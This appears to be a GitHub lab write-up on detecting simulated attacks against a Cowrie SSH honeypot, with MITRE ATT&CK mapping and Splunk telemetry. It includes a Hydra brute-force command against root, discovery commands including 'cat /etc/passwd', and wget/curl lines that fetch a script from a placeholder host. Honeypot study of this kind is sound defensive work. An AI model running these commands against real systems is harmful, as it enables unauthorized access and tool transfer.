# Cyber-Deception-Threat-Intelligence-Lab
Cowrie Honeypot Attack Stimulation

---

# Hydra Brute Force Attack Detection

## Objective

Validate the Cowrie SSH honeypot's ability to detect, capture, and log automated password guessing attacks originating from an attacker-controlled system.

---

## Background

Brute force attacks remain one of the most common techniques used by adversaries to gain unauthorized access to internet-facing services. Rather than manually attempting credentials, attackers frequently leverage automated tools such as Hydra to rapidly test large numbers of usernames and passwords against SSH services.To simulate this behavior, a custom password wordlist was created on the Kali Linux attacker machine and used to launch an automated credential attack against the Cowrie SSH honeypot.

---

## Creating the Password Wordlist

A custom password list was created using Nano on the Kali Linux attack workstation.

### Password List

```text
admin
password123
welcome
qwerty
loveyou
```

### Screenshot

<img width="1021" height="470" alt="image" src="https://github.com/user-attachments/assets/96d7f897-631f-4928-bb6c-7274c2850cd7" />

---

## Attack Simulation

The following Hydra command was executed from Kali Linux:

```bash
hydra -l root -P password.txt 10.0.2.5 -s 2222 ssh
```

### Command Breakdown

| Parameter | Purpose |
|------------|-----------|
| `-l root` | Target username |
| `-P password.txt` | Password wordlist |
| `10.0.2.5` | Cowrie Honeypot IP |
| `-s 2222` | Cowrie SSH Port |
| `ssh` | Target service |

<img width="1229" height="506" alt="image" src="https://github.com/user-attachments/assets/c698c7d6-350a-4f1a-9c33-94d29c62c61b" />

---

## Expected Attack Behavior

Hydra systematically attempts each password in the provided wordlist against the target SSH service.

Credential combinations tested:

```text
root/admin
root/password123
root/welcome
root/qwerty
root/loveyou
```

---

## Evidence Collection

During execution, Cowrie logs were monitored using:

```bash
tail -f ~/cowrie/var/log/cowrie/cowrie.log
```

<img width="1047" height="259" alt="image" src="https://github.com/user-attachments/assets/76c9b8c6-ca13-44ba-98ea-00aca938927d" />

**Hydra successfully identified multiple accepted credentials, with Cowrie recording successful authentication events and generating attacker telemetry.**

The honeypot recorded:

- Failed login attempts
- Username targeting activity
- Password guessing behavior
- Source IP address information
- Authentication outcomes

  **Confirmation in Kali Linux that the passwords were found**

  <img width="1215" height="274" alt="image" src="https://github.com/user-attachments/assets/82fbee95-0cef-4418-a0d7-3ae770312b35" />


   **Confirmation in Honeypot of the login attempts with the passwords**
  ```bash
  grep "login attempt" ~/cowrie/var/log/cowrie/cowrie.log
  ```

 <img width="545" height="116" alt="image" src="https://github.com/user-attachments/assets/50e49b48-e0e6-4995-9677-1490f7d4bdea" />

---


**What telemetry was generated?**

```text
Authentication Events
Username Attempts
Password Attempts
Source IP Information
Session Data
```
---

## MITRE ATT&CK Mapping

### Credential Access
T1110.001 - Password Guessing

---

## Security Significance

This use case demonstrates how defenders can leverage honeypot telemetry to identify credential access activity before a real system is compromised. Cowrie is configured to accept common passwords and quickly hand over a shell.

By intentionally exposing a monitored SSH service, Cowrie provides visibility into:

- Common attacker passwords
- Targeted usernames
- Brute force patterns
- Source IP addresses
- Authentication behavior

This intelligence can be leveraged to improve detections, enrich threat hunting investigations, and enhance defensive monitoring.

---

# Use Case 6: Post-Compromise Discovery

## Objective

Capture attacker reconnaissance activity after gaining shell access.

<img width="405" height="93" alt="image" src="https://github.com/user-attachments/assets/f3c9442c-5bf8-45db-a273-baae6f6d318f" />

<img width="559" height="159" alt="image" src="https://github.com/user-attachments/assets/86743a8b-943f-4075-aec2-a7d2aa12b26b" />


## Attack Simulation

```bash
whoami
pwd
uname -a
id
ls
cat /etc/passwd
```

## MITRE ATT&CK

- T1082 – System Information Discovery
- T1083 – File and Directory Discovery

## Evidence Collected

- Commands executed
- Session activity
- Discovery behavior

## Outcome

✅ Discovery activity captured

✅ Attacker behavior recorded

---

# Use Case 7: File Download & Tool Transfer

## Objective

Capture malware delivery and tool transfer attempts.

## Attack Simulation

```bash
wget http://example.com/test.sh
```

or

```bash
curl http://example.com/test.sh
```

## MITRE ATT&CK

- T1105 – Ingress Tool Transfer

## Evidence Collected

- Download attempts
- File transfer activity
- Command execution telemetry

## Outcome

✅ Tool transfer activity recorded

✅ Command telemetry collected

---

# Use Case 8: Threat Intelligence Collection

## Objective

Aggregate attacker activity into actionable threat intelligence.

## Intelligence Collected

- Source IP Addresses
- Usernames
- Password Attempts
- Successful Logins
- Failed Logins
- Commands Executed
- Session Activity
- File Download Attempts

## Outcome

✅ Threat intelligence generated

✅ Adversary behavior documented

---

# Use Case 9: Splunk Threat Intelligence Dashboard

## Objective

Visualize attacker activity in real time using Splunk.

## Dashboard Components

- Authentication Activity
- Top Usernames
- Top Passwords
- Source IP Addresses
- Commands Executed
- File Download Attempts
- Event Volume Trends

## Outcome

✅ Live threat intelligence dashboard created

✅ Real-time attack visibility achieved

---

# Use Case 10: MITRE ATT&CK Correlation

## Objective

Map Cowrie honeypot activity to MITRE ATT&CK techniques.

| Activity | ATT&CK Technique |
|-----------|-----------|
| Nmap Scan | T1595 – Active Scanning |
| Hydra Attack | T1110 – Brute Force |
| Successful Login | T1078 – Valid Accounts |
| Discovery Commands | T1082 – System Information Discovery |
| File Download Attempt | T1105 – Ingress Tool Transfer |

## Outcome

✅ ATT&CK mapping completed

✅ Adversary behavior categorized

✅ Detection engineering opportunities identified

---

# Final Results

- Captured attacker activity using a Cowrie SSH Honeypot
- Simulated adversary behavior using Kali Linux
- Detected reconnaissance activity using Nmap
- Detected credential attacks using Hydra
- Captured successful authentication events
- Recorded post-compromise discovery activity
- Logged tool transfer attempts
- Generated actionable threat intelligence
- Visualized attack telemetry in Splunk
- Correlated activity to MITRE ATT&CK techniques

## Key Takeaway

> A honeypot is not designed to stop attacks—it is designed to make them visible.

By intentionally accepting attacker interactions and recording every action, Cowrie provides defenders with valuable telemetry that can be leveraged for threat hunting, threat intelligence, detection engineering, and adversary emulation exercises.
